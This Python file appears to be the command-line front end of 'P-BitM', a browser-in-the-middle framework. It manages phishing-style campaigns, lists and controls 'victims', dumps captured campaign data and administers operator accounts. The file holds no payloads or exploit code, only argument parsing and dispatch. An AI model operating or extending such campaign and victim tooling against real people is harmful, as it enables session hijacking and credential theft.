#!/usr/bin/env python3
"""
P-BitM CLI - Persistent Browser-in-the-Middle Framework
Main entry point for command-line interface
"""

import os
import sys
import argparse
from pathlib import Path

# Resolve relative project paths consistently even when invoked from elsewhere.
PROJECT_ROOT = Path(__file__).resolve().parent
os.chdir(PROJECT_ROOT)
sys.path.insert(0, str(PROJECT_ROOT))

from cli import __version__
from cli.commands import (
    # Global commands
    cmd_setup, cmd_up, cmd_down, cmd_status, cmd_doctor,

    # Campaign commands
    cmd_campaign_list, cmd_campaign_status, cmd_campaign_start,
    cmd_campaign_stop, cmd_campaign_logs,
    cmd_campaign_remove, cmd_campaign_dump,

    # Victim commands
    cmd_victim_list, cmd_victim_status, cmd_victim_start,
    cmd_victim_stop, cmd_victim_logs,

    # Admin commands
    cmd_admin_config, cmd_admin_reset_password, cmd_admin_users,

    # Maintenance
    cmd_cleanup, cmd_reset
)
from cli.utils import error, show_banner, should_show_banner

# Argcomplete for tab completion
try:
    import argcomplete
    ARGCOMPLETE_AVAILABLE = True
except ImportError:
    ARGCOMPLETE_AVAILABLE = False


class SmartArgumentParser(argparse.ArgumentParser):
    """
    Custom ArgumentParser that automatically shows help on errors
    and provides better user guidance
    """

    def error(self, message):
        """Override error to show help automatically"""
        sys.stderr.write(f'\n[ERROR] {message}\n\n')
        sys.stderr.write('💡 Use -h or --help to see available commands\n\n')
        self.print_help(sys.stderr)
        sys.exit(2)


def create_parser():
    """Create argument parser"""
    parser = SmartArgumentParser(
        prog='pbitm.py',
        description="P-BitM - Persistent Browser-in-the-Middle Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True
    )

    # Global flags
    parser.add_argument(
        '--version',
        action='version',
        version=f'P-BitM v{__version__}'
    )

    parser.add_argument(
        '--install-completion',
        action='store_true',
        help='Install shell completion (bash/zsh)'
    )

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug output'
    )

    subparsers = parser.add_subparsers(dest='command', help='Available commands', metavar='COMMAND')

    # =========================================================================
    # GLOBAL COMMANDS
    # =========================================================================

    # setup
    setup_parser = subparsers.add_parser('setup', help='Provision or reconcile local runtime files')
    setup_parser.add_argument(
        '--rotate-dns-secrets',
        '--rotate-duckdns-token',
        dest='rotate_dns_secrets',
        action='store_true',
        help='Replace credentials for the configured DNS provider'
    )

    # up
    up_parser = subparsers.add_parser('up', help='Start all services')
    up_parser.add_argument('--build', action='store_true', help='Force rebuild images')

    # down
    down_parser = subparsers.add_parser(
        'down',
        help='Terminate all services and campaign workloads',
    )
    down_parser.add_argument(
        '--volumes',
        action='store_true',
        help='Also remove Compose volumes after the terminal shutdown',
    )

    # status
    status_parser = subparsers.add_parser('status', help='Show global status')
    status_parser.add_argument('--format', choices=['table', 'json'], default='table')

    doctor_parser = subparsers.add_parser(
        'doctor',
        help='Run read-only deployment and pre-release checks'
    )
    doctor_parser.add_argument(
        '--format',
        choices=['table', 'json'],
        default='table',
        help='Output format'
    )
    doctor_parser.add_argument(
        '--strict',
        action='store_true',
        help='Treat warnings as failures for release automation'
    )

    # =========================================================================
    # CAMPAIGN GROUP (custom parsing)
    # =========================================================================

    campaign_parser = subparsers.add_parser(
        'campaign',
        help='Manage campaigns',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  list                         List all campaigns
  <campaign-id> status         Show campaign details
  <campaign-id> start          Start campaign
  <campaign-id> stop           Stop campaign
  <campaign-id> logs           Show logs
  <campaign-id> remove         Remove campaign
  <campaign-id> dump           Export data
  <campaign-id> victim list    List victims
  <campaign-id> victim <id>    Victim operations

Examples:
  python3 p-bitm.py campaign list
  python3 p-bitm.py campaign abc123 status
  python3 p-bitm.py campaign abc123 logs --follow
  python3 p-bitm.py campaign abc123 victim list
        """
    )
    campaign_parser.add_argument('campaign_args', nargs='*', help=argparse.SUPPRESS)

    # =========================================================================
    # ADMIN GROUP
    # =========================================================================

    admin_parser = subparsers.add_parser(
        'admin',
        help='Admin operations',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  config           Show configuration
  reset-password   Reset admin password
  users            Manage users

Examples:
  python3 p-bitm.py admin config
  python3 p-bitm.py admin config --edit
  python3 p-bitm.py admin reset-password
  python3 p-bitm.py admin users
  python3 p-bitm.py admin users create operator1 --email operator@example.com
        """
    )
    admin_subparsers = admin_parser.add_subparsers(dest='admin_action', help='Admin commands')

    # admin config
    admin_config_parser = admin_subparsers.add_parser('config', help='Show configuration')
    admin_config_parser.add_argument('--edit', action='store_true', help='Edit in $EDITOR')

    # admin reset-password
    admin_reset_pw_parser = admin_subparsers.add_parser('reset-password', help='Reset password')
    admin_reset_pw_parser.add_argument('--username', help='Username (default: admin)')

    # admin users
    admin_users_parser = admin_subparsers.add_parser(
        'users',
        help='Manage users',
        epilog=(
            "Actions: list, create, set-role, enable, disable, delete\n"
            "Examples:\n"
            "  python3 p-bitm.py admin users\n"
            "  python3 p-bitm.py admin users create operator1 "
            "--email operator@example.com\n"
            "  python3 p-bitm.py admin users set-role operator1 --role admin"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    admin_users_parser.add_argument(
        'users_action',
        nargs='?',
        default='list',
        choices=['list', 'create', 'set-role', 'enable', 'disable', 'delete'],
    )
    admin_users_parser.add_argument('users_username', nargs='?')
    admin_users_parser.add_argument('--email')
    admin_users_parser.add_argument('--role', choices=['admin', 'operator'])
    admin_users_parser.add_argument('--format', choices=['table', 'json'], default='table')
    admin_users_parser.add_argument('--force', action='store_true')

    # =========================================================================
    # MAINTENANCE
    # =========================================================================

    # cleanup
    cleanup_parser = subparsers.add_parser('cleanup', help='Cleanup inactive containers')
    cleanup_parser.add_argument('--campaigns', action='store_true', help='Also cleanup campaigns')

    # reset
    subparsers.add_parser('reset', help='Full system reset')

    return parser


def parse_campaign_command(args_list):
    """Parse campaign subcommands manually"""
    if not args_list:
        # Show help for campaign command
        sys.stderr.write('\n[ERROR] Missing campaign command\n\n')
        sys.stderr.write('💡 Usage:\n')
        sys.stderr.write('  python3 p-bitm.py campaign list\n')
        sys.stderr.write('  python3 p-bitm.py campaign <id> <action>\n\n')
        sys.stderr.write('Use: python3 p-bitm.py campaign -h for full help\n\n')
        return None

    result = {}

    # Case 1: campaign list
    if args_list[0] == 'list':
        result['action'] = 'list'
        result['format'] = 'table'
        if '--format' in args_list:
            idx = args_list.index('--format')
            if idx + 1 < len(args_list):
                result['format'] = args_list[idx + 1]
        return result

    # Case 2: campaign <id> <action>
    campaign_id = args_list[0]
    result['campaign_id'] = campaign_id

    if len(args_list) < 2:
        sys.stderr.write(f'\n[ERROR] Missing action for campaign {campaign_id}\n\n')
        sys.stderr.write('💡 Available actions:\n')
        sys.stderr.write('  status, start, stop, logs, remove, dump, victim\n\n')
        sys.stderr.write(f'Use: python3 p-bitm.py campaign -h for full help\n\n')
        return None

    action = args_list[1]
    result['action'] = action

    # Parse action-specific args
    if action == 'status':
        result['format'] = 'table'
        if '--format' in args_list:
            idx = args_list.index('--format')
            if idx + 1 < len(args_list):
                result['format'] = args_list[idx + 1]

    elif action in ['start', 'stop']:
        pass  # No extra args

    elif action == 'logs':
        result['follow'] = '--follow' in args_list or '-f' in args_list
        result['tail'] = None
        if '--tail' in args_list:
            idx = args_list.index('--tail')
            if idx + 1 < len(args_list):
                try:
                    result['tail'] = int(args_list[idx + 1])
                except ValueError:
                    error("--tail requires a number")
                    return None

    elif action == 'remove':
        result['force'] = '--force' in args_list

    elif action == 'dump':
        result['output'] = None
        result['format'] = 'json'
        if '-o' in args_list:
            idx = args_list.index('-o')
            if idx + 1 < len(args_list):
                result['output'] = args_list[idx + 1]
        elif '--output' in args_list:
            idx = args_list.index('--output')
            if idx + 1 < len(args_list):
                result['output'] = args_list[idx + 1]

    elif action == 'victim':
        if len(args_list) < 3:
            sys.stderr.write(f'\n[ERROR] Missing victim command\n\n')
            sys.stderr.write('💡 Usage:\n')
            sys.stderr.write(f'  python3 p-bitm.py campaign {campaign_id} victim list\n')
            sys.stderr.write(f'  python3 p-bitm.py campaign {campaign_id} victim <id> <action>\n\n')
            return None

        victim_action = args_list[2]
        result['victim_action'] = victim_action

        if victim_action == 'list':
            result['format'] = 'table'
            if '--format' in args_list:
                idx = args_list.index('--format')
                if idx + 1 < len(args_list):
                    result['format'] = args_list[idx + 1]
        else:
            victim_id = victim_action
            result['victim_id'] = victim_id

            if len(args_list) < 4:
                sys.stderr.write(f'\n[ERROR] Missing action for victim {victim_id}\n\n')
                sys.stderr.write('💡 Available actions: status, start, stop, logs\n\n')
                return None

            result['victim_action'] = args_list[3]

            if result['victim_action'] == 'logs':
                result['follow'] = '--follow' in args_list or '-f' in args_list
                result['tail'] = None
                if '--tail' in args_list:
                    idx = args_list.index('--tail')
                    if idx + 1 < len(args_list):
                        try:
                            result['tail'] = int(args_list[idx + 1])
                        except ValueError:
                            error("--tail requires a number")
                            return None
            elif result['victim_action'] == 'status':
                result['format'] = 'table'

    else:
        sys.stderr.write(f'\n[ERROR] Unknown campaign action: {action}\n\n')
        sys.stderr.write('💡 Available actions:\n')
        sys.stderr.write('  status, start, stop, logs, remove, dump, victim\n\n')
        return None

    return result


def main():
    parser = create_parser()

    # Enable argcomplete
    if ARGCOMPLETE_AVAILABLE:
        argcomplete.autocomplete(parser)

    args = parser.parse_args()

    # Handle completion installation
    if args.install_completion:
        from cli.utils import install_completion
        install_completion()
        sys.exit(0)

    # Store debug flag globally
    if args.debug:
        os.environ['PBITM_DEBUG'] = '1'

    # =========================================================================
    # BANNER LOGIC: Configurable via config.yaml
    # =========================================================================

    # Case 1: No command provided (help screen)
    if not args.command:
        if should_show_banner(is_help=True):
            show_banner()
        parser.print_help()
        sys.exit(0)

    # Case 2: Specific command
    machine_readable = (
        args.command in {'doctor', 'status'}
        and getattr(args, 'format', 'table') == 'json'
    )
    if not machine_readable and should_show_banner(command_name=args.command):
        show_banner()

    # Execute command
    try:
        success = execute_command(args)
        sys.exit(0 if success else 1)

    except KeyboardInterrupt:
        error("\n\nInterrupted by user")
        sys.exit(130)
    except Exception as e:
        error(f"Unexpected error: {e}")

        # Show traceback if debug
        if args.debug:
            import traceback
            traceback.print_exc()

        sys.exit(1)


def execute_command(args):
    """Execute command based on parsed arguments"""

    # =========================================================================
    # GLOBAL COMMANDS
    # =========================================================================

    if args.command == 'setup':
        return cmd_setup(rotate_dns_secrets=args.rotate_dns_secrets)

    elif args.command == 'up':
        return cmd_up(build=args.build)

    elif args.command == 'down':
        return cmd_down(volumes=args.volumes)

    elif args.command == 'status':
        return cmd_status(output_format=args.format)

    elif args.command == 'doctor':
        return cmd_doctor(
            output_format=args.format,
            strict=args.strict,
        )

    # =========================================================================
    # CAMPAIGN COMMANDS (custom parsing)
    # =========================================================================

    elif args.command == 'campaign':
        campaign_args = parse_campaign_command(args.campaign_args)

        if not campaign_args:
            return False

        action = campaign_args.get('action')

        # campaign list
        if action == 'list':
            return cmd_campaign_list(output_format=campaign_args.get('format', 'table'))

        # campaign <id> actions
        campaign_id = campaign_args.get('campaign_id')

        if action == 'status':
            return cmd_campaign_status(campaign_id, output_format=campaign_args.get('format', 'table'))

        elif action == 'start':
            return cmd_campaign_start(campaign_id)

        elif action == 'stop':
            return cmd_campaign_stop(campaign_id)

        elif action == 'logs':
            return cmd_campaign_logs(
                campaign_id,
                follow=campaign_args.get('follow', False),
                tail=campaign_args.get('tail')
            )

        elif action == 'remove':
            return cmd_campaign_remove(campaign_id, force=campaign_args.get('force', False))

        elif action == 'dump':
            return cmd_campaign_dump(
                campaign_id,
                output=campaign_args.get('output'),
                format=campaign_args.get('format', 'json')
            )

        elif action == 'victim':
            victim_action = campaign_args.get('victim_action')

            if victim_action == 'list':
                return cmd_victim_list(campaign_id, output_format=campaign_args.get('format', 'table'))

            victim_id = campaign_args.get('victim_id')

            if victim_action == 'status':
                return cmd_victim_status(campaign_id, victim_id, output_format=campaign_args.get('format', 'table'))

            elif victim_action == 'start':
                return cmd_victim_start(campaign_id, victim_id)

            elif victim_action == 'stop':
                return cmd_victim_stop(campaign_id, victim_id)

            elif victim_action == 'logs':
                return cmd_victim_logs(
                    campaign_id,
                    victim_id,
                    follow=campaign_args.get('follow', False),
                    tail=campaign_args.get('tail')
                )

            else:
                error(f"Unknown victim action: {victim_action}")
                return False

        else:
            error(f"Unknown campaign action: {action}")
            return False

    # =========================================================================
    # ADMIN COMMANDS
    # =========================================================================

    elif args.command == 'admin':

        if not args.admin_action:
            # Auto-show help
            sys.stderr.write('\n[ERROR] Missing admin command\n\n')
            sys.stderr.write('💡 Available commands:\n')
            sys.stderr.write('  config           Show configuration\n')
            sys.stderr.write('  reset-password   Reset admin password\n')
            sys.stderr.write('  users            Manage users\n\n')
            sys.stderr.write('Use: python3 p-bitm.py admin -h for full help\n\n')
            return False

        # admin config
        if args.admin_action == 'config':
            return cmd_admin_config(edit=args.edit)

        # admin reset-password
        elif args.admin_action == 'reset-password':
            return cmd_admin_reset_password(username=args.username)

        # admin users
        elif args.admin_action == 'users':
            return cmd_admin_users(
                action=args.users_action,
                username=args.users_username,
                email=args.email,
                role=args.role,
                output_format=args.format,
                force=args.force,
            )

        else:
            error(f"Unknown admin action: {args.admin_action}")
            return False

    # =========================================================================
    # MAINTENANCE
    # =========================================================================

    elif args.command == 'cleanup':
        return cmd_cleanup(victims=True, campaigns=args.campaigns)

    elif args.command == 'reset':
        return cmd_reset()

    else:
        error(f"Unknown command: {args.command}")
        return False


if __name__ == '__main__':
    main()
